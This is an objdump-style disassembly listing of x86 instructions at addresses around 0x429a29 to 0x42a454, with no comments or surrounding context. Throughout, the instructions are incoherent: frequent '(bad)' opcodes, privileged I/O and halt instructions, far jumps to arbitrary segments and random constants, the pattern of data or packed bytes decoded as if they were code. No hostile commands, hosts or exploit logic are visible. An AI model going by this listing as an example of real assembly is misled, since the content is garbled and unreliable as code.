  429a29:	lods   eax,DWORD PTR ds:[esi]
  429a2a:	scas   al,BYTE PTR es:[edi]
  429a2b:	push   cs
  429a2c:	xor    eax,0x9a7caf9f
  429a31:	add    BYTE PTR ds:0xf8c3,0x0
	...
  429a94:	add    BYTE PTR [eax],al
  429a96:	into   
  429a97:	std    
  429a98:	sti    
  429a99:	leave  
  429a9a:	sti    
  429a9b:	iret   
  429a9c:	(bad)  
  429a9d:	jmp    DWORD PTR [ecx]
  429a9f:	dec    eax
  429aa0:	mov    edi,0x7f615413
  429aa5:	mov    dh,0x45
  429aa7:	mov    ebp,0x1070001
  429aac:	add    BYTE PTR [eax],al
  429aae:	push   edi
  429aaf:	adc    al,0x57
  429ab1:	dec    ecx
  429ab2:	mov    ecx,0x737357e9
  429ab7:	icebp  
  429ab8:	cmp    BYTE PTR [ebx],0xc7
  429abb:	lods   al,BYTE PTR ds:[esi]
  429abc:	sub    BYTE PTR [eax-0x504666f0],al
  429ac2:	cli    
  429ac3:	adc    BYTE PTR [esi+0x68dad24c],ch
  429ac9:	cld    
  429aca:	mov    ebp,0x9da0f991
  429acf:	and    al,0x20
  429ad1:	pop    esi
  429ad2:	xor    ebp,edi
  429ad4:	push   esp
  429ad5:	xor    BYTE PTR [edx+0x20782125],ah
  429adb:	push   edx
  429adc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429add:	mov    ds:0xa1068a46,eax
  429ae2:	ds fxch st(6)
  429ae5:	jmp    0x1c1:0xe16285d8
  429aec:	fdiv   st(1),st
  429aee:	test   DWORD PTR [esi-0x56],0xf8052b74
  429af5:	pop    ss
  429af6:	or     BYTE PTR ds:0xb07b319e,dh
  429afc:	sbb    BYTE PTR [esi+ebp*4],bl
  429aff:	mov    edi,0x763086d2
  429b04:	sti    
  429b05:	out    0x68,al
  429b07:	hlt    
  429b08:	push   esi
  429b09:	in     al,dx
  429b0a:	mov    dh,0x26
  429b0c:	add    al,0xea
  429b0e:	and    BYTE PTR [ebx+0x32],bh
  429b11:	imul   edx,DWORD PTR [ebx],0x31
  429b14:	adc    al,0x61
  429b16:	mov    al,ds:0x1ea9df82
  429b1b:	dec    ebp
  429b1c:	or     bl,BYTE PTR [ecx+0x22a3bfe]
  429b22:	out    dx,eax
  429b23:	and    cl,ah
  429b25:	pop    ds
  429b26:	mov    ebp,0x44dcc9d0
  429b2b:	pop    ebx
  429b2c:	mov    edi,DWORD PTR [edi+0x71]
  429b2f:	dec    esi
  429b30:	push   ebp
  429b31:	and    al,0x36
  429b33:	mov    BYTE PTR [ecx+edx*4-0x5746b3b1],ah
  429b3a:	xor    esi,DWORD PTR [eax]
  429b3c:	lods   eax,DWORD PTR ds:[esi]
  429b3d:	inc    edx
  429b3e:	cmc    
  429b3f:	cld    
  429b40:	fcmovnbe st,st(5)
  429b42:	pop    ecx
  429b43:	fst    DWORD PTR [eax+0x71]
  429b46:	loopne 0x429b82
  429b48:	pop    esi
  429b49:	jne    0x429b72
  429b4b:	adc    edx,edx
  429b4d:	jp     0x429adb
  429b4f:	sub    DWORD PTR [esp+ebx*4],ebp
  429b52:	jns    0x429b25
  429b54:	jecxz  0x429afd
  429b56:	ss pop esi
  429b58:	sbb    al,0xcf
  429b5a:	sbb    al,0xd3
  429b5c:	inc    esp
  429b5d:	aaa    
  429b5e:	lods   eax,DWORD PTR ds:[esi]
  429b5f:	sub    esp,DWORD PTR [eax]
  429b61:	xchg   esp,eax
  429b62:	hlt    
  429b63:	(bad)  
  429b64:	int3   
  429b65:	mov    ds,WORD PTR [edx-0x2c]
  429b68:	loop   0x429bc4
  429b6a:	cmp    BYTE PTR [ebx+0x5708c27c],bl
  429b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b71:	fidivr DWORD PTR [edx]
  429b73:	xor    eax,0x14106510
  429b78:	fmulp  st(1),st
  429b7a:	repz add eax,0x916312b5
  429b80:	(bad)  
  429b81:	rol    BYTE PTR [ecx],0xda
  429b84:	out    dx,al
  429b85:	(bad)  
  429b86:	iret   
  429b87:	lods   al,BYTE PTR ds:[esi]
  429b88:	rcl    BYTE PTR [ecx+0x20],cl
  429b8b:	fsub   st(0),st
  429b8d:	jecxz  0x429b9d
  429b8f:	call   0x4285ed42
  429b94:	jg     0x429b4e
  429b96:	aam    0x3
  429b98:	fdivr  QWORD PTR [ebx-0x23688bf2]
  429b9e:	inc    ecx
  429b9f:	or     BYTE PTR [edi+0x5d],dh
  429ba2:	lods   al,BYTE PTR ds:[esi]
  429ba3:	fcomp  DWORD PTR [ebx-0x3f]
  429ba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ba7:	fbstp  TBYTE PTR [ecx-0x30]
  429baa:	out    0xf3,al
  429bac:	(bad)  
  429bad:	xchg   edi,eax
  429bae:	scas   eax,DWORD PTR es:[edi]
  429baf:	and    ch,ch
  429bb1:	sar    DWORD PTR [ecx+0xc1f2],0x0
	...
  429c14:	add    BYTE PTR [eax],al
  429c16:	mov    ds:0xb788a616,eax
  429c1b:	mov    eax,0x52a3faf
  429c20:	xchg   esp,eax
  429c21:	pop    eax
  429c22:	mov    ah,0x21
  429c24:	dec    ebp
  429c25:	outs   dx,BYTE PTR ds:[esi]
  429c26:	dec    esp
  429c27:	mov    esi,0x1070001
  429c2c:	add    BYTE PTR [eax],al
  429c2e:	and    eax,0x4d6f9e4e
  429c33:	bound  edi,QWORD PTR [edi+0x37]
  429c36:	jge    0x429c84
  429c38:	mov    ebx,0xdff18151
  429c3d:	xchg   edx,eax
  429c3e:	or     ebp,ebp
  429c40:	xchg   BYTE PTR [esi-0x134753ef],dh
  429c46:	rol    BYTE PTR [ebp-0x17b30058],1
  429c4c:	xor    al,0x56
  429c4e:	retf   0x2c15
  429c51:	test   eax,0x945ba8f0
  429c56:	pop    esi
  429c57:	lahf   
  429c58:	pop    esp
  429c59:	test   BYTE PTR [edi],al
  429c5b:	and    al,0x2f
  429c5d:	and    al,0xc5
  429c5f:	js     0x429c50
  429c61:	add    eax,0x7c464f00
  429c66:	jns    0x429c31
  429c68:	sahf   
  429c69:	sbb    eax,0x42cb791
  429c6e:	or     al,0x8f
  429c70:	jmp    0xd15a:0x618f0fe
  429c77:	cmp    al,0x48
  429c79:	mov    edx,DWORD PTR [ebx]
  429c7b:	aam    0xa1
  429c7d:	out    dx,eax
  429c7e:	jae    0x429cc8
  429c80:	mov    esi,0xde978f46
  429c85:	jl     0x429c53
  429c87:	data16 int 0x1
  429c8a:	dec    eax
  429c8b:	mov    ds:0xf8eff938,al
  429c90:	dec    edi
  429c91:	mov    dl,0xb5
  429c93:	call   0xc2ce:0x28c3ab13
  429c9a:	cdq    
  429c9b:	out    0xf7,al
  429c9d:	mov    eax,0xeea0b6be
  429ca2:	jae    0x429cf9
  429ca4:	int    0x13
  429ca6:	jecxz  0x429d11
  429ca8:	jle    0x429cef
  429caa:	pop    ebx
  429cab:	punpcklbw mm0,DWORD PTR [ebx+eiz*8-0x7972e7bf]
  429cb3:	or     bl,BYTE PTR [ebx-0x754d4372]
  429cb9:	adc    al,0x8f
  429cbb:	out    0xb,eax
  429cbd:	dec    ecx
  429cbe:	orps   xmm6,XMMWORD PTR [ecx+esi*4+0x40f079a0]
  429cc6:	xor    ch,ah
  429cc8:	int    0x3b
  429cca:	jge    0x429cee
  429ccc:	jmp    0x4fa6d1b
  429cd1:	fsubr  QWORD PTR [di]
  429cd4:	sub    eax,0x6e22034b
  429cd9:	enter  0xfd95,0x39
  429cdd:	jge    0x429c88
  429cdf:	int    0x6a
  429ce1:	pop    ss
  429ce2:	ds sub bl,ah
  429ce5:	mov    ds:0xd3e79a75,al
  429cea:	and    BYTE PTR [ebx+0x68],ah
  429ced:	xchg   esp,eax
  429cee:	cld    
  429cef:	jmp    FWORD PTR [esi-0x14]
  429cf2:	adc    DWORD PTR [edx+ecx*1],ebx
  429cf5:	aaa    
  429cf6:	loope  0x429d4e
  429cf8:	loopne 0x429cf0
  429cfa:	xlat   BYTE PTR ds:[ebx]
  429cfb:	(bad)  
  429cfc:	ins    BYTE PTR es:[edi],dx
  429cfd:	jno    0x429cac
  429cff:	adc    BYTE PTR [esi],bh
  429d01:	not    ebp
  429d03:	sar    BYTE PTR [eax-0x3abd59bc],cl
  429d09:	fnclex 
  429d0b:	pop    eax
  429d0c:	or     eax,0xe2864021
  429d11:	popa   
  429d12:	(bad)  
  429d16:	add    al,0x7c
  429d18:	mov    bl,0x88
  429d1a:	pop    ds
  429d1b:	jne    0x429ca7
  429d1d:	cs into 
  429d1f:	enter  0xb2e6,0x58
  429d23:	int    0x18
  429d25:	adc    DWORD PTR [edx],edi
  429d27:	xchg   ebp,eax
  429d28:	fcmovnb st,st(5)
  429d2a:	loop   0x429cba
  429d2c:	push   ds
  429d2d:	cmp    ebp,eax
  429d2f:	hlt    
  429d30:	jmp    0x0:0x5a28e26
	...
  429d93:	add    BYTE PTR [eax],al
  429d95:	add    BYTE PTR [ebx-0x13f33b49],bl
  429d9b:	jg     0x429d78
  429d9d:	mov    bh,0xb8
  429d9f:	xor    al,0xdf
  429da1:	sub    eax,0x92e1371a
  429da6:	push   ebx
  429da7:	mov    edi,0x1070001
  429dac:	add    BYTE PTR [eax],al
  429dae:	or     BYTE PTR [ebx-0x1e00eaf4],dh
  429db4:	push   ebx
  429db5:	test   bh,0x39
  429db8:	add    eax,0x826b2e61
  429dbd:	push   cs
  429dbe:	xor    ecx,DWORD PTR [eax]
  429dc0:	and    esp,esi
  429dc2:	std    
  429dc3:	scas   al,BYTE PTR es:[edi]
  429dc4:	fisttp QWORD PTR [ecx]
  429dc6:	ret    0x2e1a
  429dc9:	dec    esi
  429dca:	push   0xffffffdf
  429dcc:	mov    ds:0x13119542,al
  429dd1:	sbb    al,0x3d
  429dd3:	js     0x429dfa
  429dd5:	ret    
  429dd6:	ja     0x429e19
  429dd8:	xor    ch,BYTE PTR [edi]
  429dda:	push   eax
  429ddb:	jl     0x429d99
  429ddd:	daa    
  429dde:	xchg   ecx,eax
  429ddf:	icebp  
  429de0:	xor    ah,bh
  429de2:	stos   DWORD PTR es:[edi],eax
  429de3:	adc    DWORD PTR ss:[ecx+0x6],esi
  429de7:	add    DWORD PTR [eax+0x7d],eax
  429dea:	scas   eax,DWORD PTR es:[edi]
  429deb:	xor    DWORD PTR [ecx+0x26aa7c9d],edx
  429df1:	scas   al,BYTE PTR es:[edi]
  429df2:	xor    DWORD PTR [ebp+0x27d7ad13],0xffffffc9
  429df9:	and    DWORD PTR [ecx-0x1768937a],edx
  429dff:	mov    eax,0xbe4ff428
  429e04:	add    eax,0xef60e1f6
  429e09:	add    al,0x72
  429e0b:	mov    ah,0x3e
  429e0d:	sahf   
  429e0e:	dec    ecx
  429e0f:	das    
  429e10:	dec    esp
  429e11:	mov    eax,ds:0x8bd50373
  429e16:	popa   
  429e17:	rcl    DWORD PTR [edx+ebp*2+0x78],0xec
  429e1c:	add    BYTE PTR [esp+ecx*8+0x4f],bl
  429e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e21:	ja     0x429e5f
  429e23:	mov    ecx,DWORD PTR [edi+0x4fbe165d]
  429e29:	dec    eax
  429e2a:	inc    eax
  429e2b:	cmp    DWORD PTR [ecx+0x40],esi
  429e2e:	jl     0x429e9b
  429e30:	adc    al,0x47
  429e32:	jne    0x429dca
  429e34:	ficom  DWORD PTR [ecx-0x5d3d7c39]
  429e3a:	retf   0x50b3
  429e3d:	add    bh,al
  429e3f:	inc    edi
  429e40:	fcomp  DWORD PTR [ebx+0xa41dd8]
  429e46:	retf   0xd840
  429e49:	jg     0x429e10
  429e4b:	sbb    DWORD PTR [ebx-0x22e7e3db],ebp
  429e51:	xor    BYTE PTR [esi-0x564279e3],ah
  429e57:	arpl   WORD PTR [esi-0x50af2375],di
  429e5d:	or     BYTE PTR [ecx+eax*1],dh
  429e60:	lods   al,BYTE PTR ds:[esi]
  429e61:	paddsb mm5,QWORD PTR [ebx+0x2f7714b1]
  429e68:	sbb    ebp,0xb4157371
  429e6e:	shl    DWORD PTR [ebx+eiz*8-0x34],1
  429e72:	and    eax,0x1020d4cf
  429e77:	lds    ebp,FWORD PTR [eax+0x54a278dd]
  429e7d:	pop    esp
  429e7e:	cmp    al,0x25
  429e80:	mov    bl,0x9c
  429e82:	xchg   esp,eax
  429e83:	jg     0x429ef3
  429e85:	push   edi
  429e86:	gs scas eax,DWORD PTR es:[edi]
  429e88:	rcr    DWORD PTR [edi-0x3c],1
  429e8b:	or     BYTE PTR [eax+0x754b3831],bl
  429e91:	cmp    al,0x21
  429e93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e94:	xchg   edx,eax
  429e95:	inc    esi
  429e96:	enter  0xe85c,0x39
  429e9a:	jp     0x429e99
  429e9c:	int    0xad
  429e9e:	jmp    0x429e59
  429ea0:	sbb    edi,edx
  429ea2:	xchg   esp,eax
  429ea3:	xchg   edi,eax
  429ea4:	mov    ds:0xfbcb5c4a,eax
  429ea9:	jae    0x429f1f
  429eab:	cmp    bl,BYTE PTR [edi+0x1e]
  429eae:	pop    esp
  429eaf:	mov    dh,0xa7
  429eb1:	jl     0x429ea4
  429eb3:	test   DWORD PTR [eax+eax*1+0x0],ebx
	...
  429f13:	add    BYTE PTR [eax],al
  429f15:	add    BYTE PTR [ecx],dh
  429f17:	inc    ebp
  429f18:	enter  0xfc06,0x8f
  429f1c:	push   DWORD PTR [edi+0x54]
  429f1f:	into   
  429f20:	fnstcw WORD PTR ds:0x3b63e9a0
  429f26:	pop    edx
  429f27:	rol    BYTE PTR [ecx],0x0
  429f2a:	pop    es
  429f2b:	add    DWORD PTR [eax],eax
  429f2d:	add    BYTE PTR [esi+0xf32456c],ah
  429f33:	mov    esp,0xb95d5f85
  429f38:	jbe    0x429ec1
  429f3a:	retf   
  429f3b:	lea    esi,[esi+esi*2-0x49]
  429f3f:	lds    ebx,FWORD PTR [edi+ebx*2+0x26d1ecff]
  429f46:	bound  ebp,QWORD PTR [ebp*8+0x4f1de913]
  429f4d:	scas   al,BYTE PTR es:[edi]
  429f4e:	mov    ah,0x85
  429f50:	pop    esi
  429f51:	sub    al,0x58
  429f53:	lahf   
  429f54:	ret    0x6680
  429f57:	test   DWORD PTR [eax-0x2e41ea82],0xefff0772
  429f61:	xchg   DWORD PTR [eax-0x38],eax
  429f64:	fwait
  429f65:	ret    0x7715
  429f68:	mov    edx,0x8964cb99
  429f6d:	mov    ds:0x1bb5b853,al
  429f72:	data16 mov ch,0x42
  429f75:	test   al,0xd5
  429f77:	out    0xf9,eax
  429f79:	retf   0x8b9f
  429f7c:	or     BYTE PTR ds:0xf1e230be,dl
  429f82:	dec    ecx
  429f83:	lea    ebx,[eax-0x1995b45a]
  429f89:	mov    ecx,0x8f57b681
  429f8e:	add    ebp,DWORD PTR [eax+0x46158da6]
  429f94:	xor    cl,ah
  429f96:	cmp    bl,al
  429f98:	and    al,BYTE PTR [ebp+0x1b7e2d04]
  429f9e:	(bad)  
  429f9f:	jle    0x429fc4
  429fa1:	push   edx
  429fa2:	xchg   edi,eax
  429fa3:	hlt    
  429fa4:	out    0x2c,eax
  429fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429fa7:	lahf   
  429fa8:	mov    ds,WORD PTR [ebp+eax*4+0x1b]
  429fac:	mov    cl,BYTE PTR [ecx]
  429fae:	in     eax,0xf
  429fb0:	pushf  
  429fb1:	inc    esi
  429fb2:	aas    
  429fb3:	add    al,0xfb
  429fb5:	bound  edx,QWORD PTR [edx]
  429fb7:	push   ebp
  429fb8:	inc    ebx
  429fb9:	pop    ecx
  429fba:	inc    edx
  429fbb:	sahf   
  429fbc:	vaddsd xmm1,xmm4,QWORD PTR [edi+0x1b]
  429fc1:	pop    eax
  429fc2:	add    al,0xda
  429fc4:	add    eax,0x4b4ddc40
  429fc9:	xor    al,0x3f
  429fcb:	stos   DWORD PTR es:[edi],eax
  429fcc:	pop    ebp
  429fcd:	sbb    bh,BYTE PTR [esi*1+0x5fced788]
  429fd4:	ret    
  429fd5:	inc    ebp
  429fd7:	jo     0x42a015
  429fd9:	fcomp  QWORD PTR [edx+0x4534297f]
  429fdf:	ja     0x429fee
  429fe1:	xor    eax,0x32da14a6
  429fe6:	xchg   ebx,eax
  429fe7:	out    dx,al
  429fe8:	pop    edx
  429fe9:	popa   
  429fea:	or     edi,DWORD PTR [edi]
  429fec:	lock loopne 0x42a020
  429fef:	sbb    ah,BYTE PTR [ecx+ebx*2+0x21]
  429ff3:	stos   DWORD PTR es:[edi],eax
  429ff4:	pop    ss
  429ff5:	xor    BYTE PTR [edi-0x30acd88c],ah
  429ffb:	jg     0x429fb7
  429ffd:	(bad)  
  429ffe:	in     al,dx
  429fff:	ret    0xd4da
  42a002:	call   0x2dbf:0x99630ecb
  42a009:	fwait
  42a00a:	jmp    0x429fea
  42a00c:	imul   eax,DWORD PTR [ecx+0x32],0x34
  42a010:	jbe    0x429fe3
  42a012:	xor    BYTE PTR [eax+0x16d655aa],cl
  42a018:	adc    DWORD PTR gs:[edx+0x13],ebp
  42a01c:	jb     0x42a098
  42a01e:	cli    
  42a01f:	sahf   
  42a020:	dec    edi
  42a021:	jp     0x429fbc
  42a023:	div    BYTE PTR [ebx+0x4c31bc80]
  42a029:	(bad)  
  42a02a:	das    
  42a02b:	mov    esi,0xe116c59d
  42a030:	loop   0x42a07e
  42a032:	dec    esi
  42a033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a034:	jo     0x42a036
	...
  42a096:	xlat   BYTE PTR ds:[ebx]
  42a097:	pushf  
  42a098:	shr    BYTE PTR [ebp-0x1000235],0x30
  42a09f:	xchg   esi,eax
  42a0a0:	mov    esi,0xd71b04e
  42a0a5:	loop   0x42a108
  42a0a7:	rol    DWORD PTR [ecx],0x0
  42a0aa:	pop    es
  42a0ab:	add    DWORD PTR [eax],eax
  42a0ad:	add    BYTE PTR [ecx+0x5c434024],dh
  42a0b3:	int3   
  42a0b4:	mov    eax,DWORD PTR [ebp+ebp*8-0x7c]
  42a0b8:	shl    DWORD PTR [ebp+0x12a9c18b],1
  42a0be:	out    dx,al
  42a0bf:	add    eax,0x26cb4ba7
  42a0c4:	nop
  42a0c5:	aad    0x3e
  42a0c7:	out    dx,eax
  42a0c8:	das    
  42a0c9:	xlat   BYTE PTR ds:[ebx]
  42a0ca:	nop
  42a0cb:	in     eax,0x70
  42a0cd:	dec    esp
  42a0ce:	rcl    esi,1
  42a0d0:	dec    esi
  42a0d1:	inc    ebx
  42a0d2:	sbb    DWORD PTR [edx+0x30],eax
  42a0d5:	push   ebp
  42a0d6:	push   edi
  42a0d7:	fdivrp st(6),st
  42a0d9:	push   ss
  42a0da:	push   es
  42a0db:	imul   ebp,DWORD PTR [ebx+0x5e],0x5e
  42a0df:	cwde   
  42a0e0:	lds    esp,FWORD PTR [ebx+ebx*1+0x6510316f]
  42a0e7:	pop    ds
  42a0e8:	loopne 0x42a12f
  42a0ea:	push   0xffffffad
  42a0ec:	cld    
  42a0ed:	ror    BYTE PTR [ecx*2+0x60be6c39],0x8e
  42a0f5:	popf   
  42a0f6:	test   DWORD PTR [eax],edi
  42a0f8:	ret    0x4559
  42a0fb:	adc    esp,DWORD PTR [eax]
  42a0fd:	mov    ds:0x3a6c6cbb,eax
  42a102:	xchg   ebx,eax
  42a103:	and    al,dh
  42a105:	and    BYTE PTR [edi+0x57df2f11],cl
  42a10b:	mov    edx,esp
  42a10d:	xchg   ebx,eax
  42a10e:	sbb    DWORD PTR [esi+ebx*8+0x7f],0x7
  42a113:	cs jle 0x42a11c
  42a116:	xchg   esi,eax
  42a117:	inc    esi
  42a118:	cmp    edi,DWORD PTR [edi-0x23]
  42a11b:	enter  0xa95,0xc2
  42a11f:	cmp    dl,BYTE PTR [edx-0x2e8d47f7]
  42a125:	xchg   ebx,eax
  42a126:	dec    edi
  42a127:	push   ecx
  42a128:	pop    ss
  42a129:	jo     0x42a126
  42a12b:	cmc    
  42a12c:	add    al,BYTE PTR ss:[eax]
  42a12f:	add    edi,0x12
  42a132:	imul   eax,DWORD PTR [esi-0xf],0xffffffef
  42a136:	xor    edi,DWORD PTR [ebx+0x2f]
  42a139:	pop    DWORD PTR [edi]
  42a13b:	stos   BYTE PTR es:[edi],al
  42a13c:	adc    ebp,DWORD PTR [edi+0x3c]
  42a13f:	into   
  42a140:	ret    0xe4be
  42a143:	or     eax,0x81dce4b7
  42a148:	cmp    al,0xdd
  42a14a:	in     eax,0x1c
  42a14c:	mov    al,0xb5
  42a14e:	leave  
  42a14f:	mov    ah,0xe2
  42a151:	or     bl,al
  42a153:	jnp    0x42a137
  42a155:	or     bh,cl
  42a157:	mov    esi,DWORD PTR [esi]
  42a159:	mov    DWORD PTR [ebx-0x167abdd1],ebx
  42a15f:	lahf   
  42a160:	jno    0x42a17f
  42a162:	fadd   st(3),st
  42a164:	daa    
  42a165:	dec    esp
  42a166:	(bad)  
  42a167:	or     cl,ah
  42a169:	pcmpeqd mm6,QWORD PTR [edi]
  42a16c:	pop    esi
  42a16d:	mov    eax,0x2e6704a6
  42a172:	rol    DWORD PTR [esi],1
  42a174:	loop   0x42a138
  42a176:	pop    ebx
  42a177:	jl     0x42a179
  42a179:	mov    esp,0xa273b63c
  42a17e:	add    al,0xd8
  42a180:	hlt    
  42a181:	fstp   st(1)
  42a183:	popf   
  42a184:	pop    ds
  42a185:	cld    
  42a186:	bswap  esp
  42a188:	mov    edi,0x9c391eee
  42a18d:	mov    WORD PTR [esp],gs
  42a190:	mov    ebp,0x48acab09
  42a195:	jmp    0x4d3166b1
  42a19a:	mov    ebp,0x91a68b7a
  42a19f:	popf   
  42a1a0:	std    
  42a1a1:	lea    ebx,[eax+edx*1-0x2b4091f4]
  42a1a8:	aad    0xad
  42a1aa:	mov    ds:0x45c03254,eax
  42a1af:	(bad)  [ecx+edx*1+0x3b]
  42a1b3:	push   ds
  42a1b4:	call   0x0:0x0
	...
  42a213:	add    BYTE PTR [eax],al
  42a215:	add    BYTE PTR [ebx],ch
  42a217:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a21d:	mov    bh,0x15
  42a21f:	fucomip st,st(5)
  42a221:	imul   esi,ecx,0x68a30c93
  42a227:	ret    0x1
  42a22a:	pop    es
  42a22b:	add    DWORD PTR [eax],eax
  42a22d:	add    BYTE PTR [ebp-0x13],bh
  42a230:	(bad)  
  42a232:	inc    ebx
  42a233:	inc    edx
  42a234:	and    BYTE PTR [eax+0x195e50d4],cl
  42a23a:	cmc    
  42a23b:	jno    0x42a1c2
  42a23d:	pop    edi
  42a23e:	sub    al,0x1b
  42a240:	in     al,0xff
  42a242:	lea    esi,[edx+0x76966443]
  42a248:	dec    esi
  42a249:	in     al,dx
  42a24a:	pop    edx
  42a24b:	test   bl,al
  42a24d:	sub    ah,dl
  42a24f:	xor    eax,0x184bdde6
  42a254:	(bad)  
  42a255:	cs scas eax,DWORD PTR es:[edi]
  42a257:	rcr    DWORD PTR [ebx],cl
  42a259:	dec    ebp
  42a25a:	call   0x4507:0x57327e8
  42a261:	(bad)  
  42a262:	test   BYTE PTR [eax+0x7e17c66f],0x1b
  42a269:	sub    eax,0xec33b225
  42a26e:	jno    0x42a2e6
  42a270:	arpl   WORD PTR [eax-0x60],bx
  42a273:	jge    0x42a2ac
  42a275:	sub    BYTE PTR ds:0x3ba1913d,cl
  42a27b:	xor    esi,DWORD PTR [esi+0x16]
  42a27e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a27f:	sbb    DWORD PTR [edx+0x1d],edx
  42a282:	fcom   DWORD PTR [edx+ecx*2]
  42a285:	dec    edx
  42a286:	jmp    0x9567:0x3965ab7c
  42a28d:	mov    WORD PTR [eax],gs
  42a28f:	sahf   
  42a290:	mov    esi,0xdbdc4400
  42a295:	xor    DWORD PTR [ebx],ebp
  42a297:	mov    ebx,DWORD PTR [ecx-0x74dcfcdc]
  42a29d:	ds (bad) 
  42a2a0:	adc    edx,DWORD PTR [edi-0x66d274f0]
  42a2a6:	or     DWORD PTR [esi+0x4104049e],ebp
  42a2ac:	je     0x42a321
  42a2ae:	ret    
  42a2af:	fwait
  42a2b0:	mov    BYTE PTR [edi-0x2927241f],0x28
  42a2b7:	xchg   esi,eax
  42a2b8:	ins    DWORD PTR es:[edi],dx
  42a2b9:	mov    ds:0x4ecd0fab,eax
  42a2be:	inc    esi
  42a2bf:	es in  al,dx
  42a2c1:	sahf   
  42a2c2:	dec    ebp
  42a2c3:	outs   dx,BYTE PTR ds:[esi]
  42a2c4:	inc    esi
  42a2c6:	hlt    
  42a2c7:	mov    eax,0x773f572e
  42a2cc:	fistp  DWORD PTR es:[ebx]
  42a2cf:	icebp  
  42a2d0:	retf   0x42a1
  42a2d3:	cwde   
  42a2d4:	push   0x3c157a4b
  42a2d9:	xchg   BYTE PTR [ecx+0xe],bl
  42a2dc:	xchg   esp,eax
  42a2dd:	div    DWORD PTR [edi-0x3a]
  42a2e0:	clc    
  42a2e1:	or     DWORD PTR [edi],0xffffffce
  42a2e4:	lea    ebx,[ecx]
  42a2e6:	das    
  42a2e7:	retf   0xf386
  42a2ea:	retf   
  42a2eb:	scas   al,BYTE PTR es:[edi]
  42a2ec:	in     eax,0x4
  42a2ee:	mov    ds:0xa5cf9f54,eax
  42a2f3:	bound  edx,QWORD PTR [ecx]
  42a2f5:	push   eax
  42a2f6:	rcr    DWORD PTR [edx-0x215e70bc],1
  42a2fc:	cmp    dh,BYTE PTR [eax]
  42a2fe:	and    eax,0xee6d79c6
  42a303:	mov    ds:0x406217b7,al
  42a308:	jg     0x42a2ee
  42a30a:	jp     0x42a2d9
  42a30c:	mov    eax,ds:0xca104c67
  42a311:	cmp    esp,ebx
  42a313:	xor    eax,ebp
  42a315:	jecxz  0x42a354
  42a317:	je     0x42a2e3
  42a319:	mov    dh,0x5
  42a31b:	inc    ebx
  42a31c:	outs   dx,DWORD PTR ds:[esi]
  42a31d:	lea    ebp,[ebp+0x1a78d6e6]
  42a323:	cs xchg ebp,eax
  42a325:	pop    ecx
  42a326:	pop    esp
  42a327:	and    bh,BYTE PTR [eax]
  42a329:	inc    esi
  42a32a:	out    0xb8,al
  42a32c:	fwait
  42a32d:	addr16 mov al,ds:0x83c3
  42a331:	add    edi,DWORD PTR [esi+0xf853]
	...
  42a393:	add    BYTE PTR [eax],al
  42a395:	add    BYTE PTR [edi+0xe],bh
  42a398:	jne    0x42a3d5
  42a39a:	jne    0x42a417
  42a39c:	jg     0x42a3ec
  42a39e:	ds loop 0x42a3ca
  42a3a1:	retf   0x675c
  42a3a4:	pusha  
  42a3a5:	add    ch,BYTE PTR [edi-0x3d]
  42a3a8:	add    DWORD PTR [eax],eax
  42a3aa:	pop    es
  42a3ab:	add    DWORD PTR [eax],eax
  42a3ad:	add    BYTE PTR [edi],bh
  42a3af:	lods   eax,DWORD PTR ds:[esi]
  42a3b0:	adc    eax,0x16a52c02
  42a3b5:	scas   eax,DWORD PTR es:[edi]
  42a3b6:	dec    esp
  42a3b7:	mov    ebp,0xa2de1ef8
  42a3bc:	into   
  42a3bd:	and    eax,0xb152bec5
  42a3c2:	ja     0x42a3b9
  42a3c4:	sbb    edx,DWORD PTR [eax+0x7467b68c]
  42a3ca:	in     eax,dx
  42a3cb:	jle    0x42a3ac
  42a3cd:	in     eax,0xb7
  42a3cf:	mov    dh,0x8d
  42a3d1:	jno    0x42a438
  42a3d3:	in     eax,dx
  42a3d4:	sar    DWORD PTR [edx+0x5f2722c4],cl
  42a3da:	mov    WORD PTR [eax+0x3f],?
  42a3dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a3de:	add    BYTE PTR [esi-0x748087ef],ah
  42a3e4:	(bad)  
  42a3e5:	imul   esi,edx,0x86a70aef
  42a3eb:	cs loop 0x42a43f
  42a3ee:	mov    dl,0x2a
  42a3f0:	aaa    
  42a3f1:	inc    esi
  42a3f2:	xchg   esi,eax
  42a3f3:	xlat   BYTE PTR ds:[ebx]
  42a3f4:	jle    0x42a3eb
  42a3f6:	xlat   BYTE PTR ds:[ebx]
  42a3f7:	and    eax,esi
  42a3f9:	xor    eax,0xc09e5e70
  42a3fe:	jmp    0x42a393
  42a400:	pop    edi
  42a401:	mov    ss,WORD PTR [ebx+eiz*8-0x7218bdc0]
  42a408:	cld    
  42a409:	xor    DWORD PTR [ebx+ebp*8-0x2c],eax
  42a40d:	sub    cl,ch
  42a40f:	ret    
  42a410:	out    dx,eax
  42a411:	push   edx
  42a412:	dec    esp
  42a413:	mov    ds,WORD PTR [ebp+0x4be55228]
  42a419:	pop    edx
  42a41a:	cdq    
  42a41b:	in     eax,dx
  42a41c:	mov    bh,0x69
  42a41e:	std    
  42a41f:	or     ecx,0xbcee751
  42a425:	(bad)  
  42a426:	push   cs
  42a427:	mov    dl,0x5c
  42a429:	lea    edi,[ecx-0x6]
  42a42c:	mov    esi,0x483e10d7
  42a431:	inc    ebp
  42a432:	push   0xffffff8a
  42a434:	lods   al,BYTE PTR ds:[esi]
  42a435:	xchg   ebp,eax
  42a436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a437:	dec    ecx
  42a438:	cld    
  42a439:	in     eax,0xd8
  42a43b:	mov    esi,0x9384f199
  42a440:	add    eax,esi
  42a442:	inc    edi
  42a443:	in     al,0x60
  42a445:	ffreep st(5)
  42a447:	mov    ebp,ebx
  42a449:	pop    esi
  42a44a:	jns    0x42a45f
  42a44c:	hlt    
  42a44d:	out    0xe5,al
  42a44f:	dec    edi
  42a450:	jecxz  0x42a430
  42a452:	mov    dh,0x3e
  42a454:	pop    ebp
